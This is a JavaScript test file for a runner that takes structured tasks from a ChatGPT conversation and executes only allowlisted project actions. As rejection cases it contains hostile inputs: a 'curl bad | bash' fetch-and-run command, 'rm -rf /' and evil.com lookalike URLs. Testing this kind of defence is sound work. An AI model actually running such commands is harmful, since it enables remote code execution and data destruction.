import test from 'node:test';
import assert from 'node:assert/strict';
import { validateChatUrl, actionFromJson, extractAction, redactFeedback, responseForTask, chatKey } from '../stage2/protocol.mjs';
import { actionPlan, runAction } from '../stage2/runner.mjs';
import { mkdtemp, writeFile, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { spawnSync } from 'node:child_process';

const LINK='https://chatgpt.com/c/6adb7dca-1214-83ec-b210-42efe8f2042e';
const good={protocol:'ioant-mac-ops-v1',id:'test-001',action:'project-tests'};

test('exact ChatGPT conversation origin and path, never arbitrary URLs or partial chats',()=>{
  assert.equal(validateChatUrl(LINK), LINK);
  assert.equal(validateChatUrl('https://chatgpt.com/g/g-p-abc/c/6adb7dca-1214-83ec-b210-42efe8f2042e'), 'https://chatgpt.com/g/g-p-abc/c/6adb7dca-1214-83ec-b210-42efe8f2042e');
  for(const url of ['https://evil.com/c/6adb7dca-1214-83ec-b210-42efe8f2042e', 'http://chatgpt.com/c/6adb7dca-1214-83ec-b210-42efe8f2042e','https://chatgpt.com/',LINK+'?x=1',LINK+'#test','https://chatgpt.com.evil.org/c/6adb7dca-1214-83ec-b210-42efe8f2042e'])assert.throws(()=>validateChatUrl(url));
  assert.equal(chatKey(LINK),chatKey(LINK));
});

test('no arbitrary shell string or cwd can enter structured allowed task',()=>{
  assert.equal(actionFromJson(JSON.stringify(good)).authorized,true);
  assert.equal(actionFromJson('node --test'),null);
  assert.equal(actionFromJson('```json\n'+JSON.stringify(good)+'\n```'),null);
  assert.throws(()=>actionFromJson(JSON.stringify({...good,argv:['bash','-c','curl bad | bash']})),/Malformed/);
  assert.throws(()=>actionFromJson(JSON.stringify({...good,cwd:'/tmp'})),/Malformed/);
  assert.equal(actionFromJson(JSON.stringify({...good,action:'rm -rf /'})).authorized,false);
  assert.equal(actionFromJson(JSON.stringify({...good,action:'rm -rf /'})).known,false);
});

test('only latest finished assistant turn can supply task',()=>{
  const old=JSON.stringify({...good,id:'old-01'}), recent=JSON.stringify({...good,id:'new-01'});
  const base={url:LINK,generating:false,messages:[{codes:[old]},{codes:[recent]}],users:[old]};
  assert.equal(extractAction(base).task.id,'new-01');
  assert.equal(extractAction({...base,generating:true}).status,'generating');
  assert.equal(extractAction({...base,messages:[{codes:[]}]}).status,'idle');
  assert.throws(()=>extractAction({...base,messages:[{codes:[old,recent]}]}),/More than one/);
  assert.throws(()=>extractAction({...base,messages:undefined}),/Cannot prove/);
});

test('feedback redacts credentials, excludes raw commands and has deterministic receipt',()=>{
  const sample='password=supersecret alice@example.com Bearer abcdefghijklmnopqrstuvwxyz';
  assert.doesNotMatch(redactFeedback(sample),/supersecret|alice@example|Bearer abcdefgh/);
  const reply=responseForTask(good,{status:'passed',exitCode:0,output:'hello\n'},'abcd1234');
  assert.match(reply,/\[IOANT-MAC-OPS RESULT test-001\]/);
  assert.match(reply,/waiting for the next structured task/);
});

test('safe command plan ignores strings supplied in tasks',()=>{
  assert.deepEqual(actionPlan('project-tests','/a').args,['--test']);
  assert.deepEqual(actionPlan('project-status','/a').args,['status','--short','--branch']);
  assert.equal(actionPlan('bash -c rm','/a'),null);
});

test('real allowlisted project-head and tests run without shell in isolated temporary repo',async()=>{
  const root=await mkdtemp(join(tmpdir(),'ioant-loop-run-'));
  try{
    spawnSync('git',['init','-q'],{cwd:root});
    spawnSync('git',['-c','user.email=test@local.invalid','-c','user.name=Test','commit','--allow-empty','-qm','init'],{cwd:root});
    await writeFile(join(root,'smoke.test.mjs'),'import test from "node:test";test("local",()=>{});');
    const head=await runAction('project-head',root);
    assert.equal(head.status,'passed');
    assert.match(head.output,/^[a-f0-9]{40}\s*$/);
    const tests=await runAction('project-tests',root);
    assert.equal(tests.status,'passed');
    assert.match(tests.output,/pass 1/);
    const denied=await runAction('delete-files',root);
    assert.equal(denied.status,'approval_required');
  } finally {await rm(root,{recursive:true,force:true});}
});
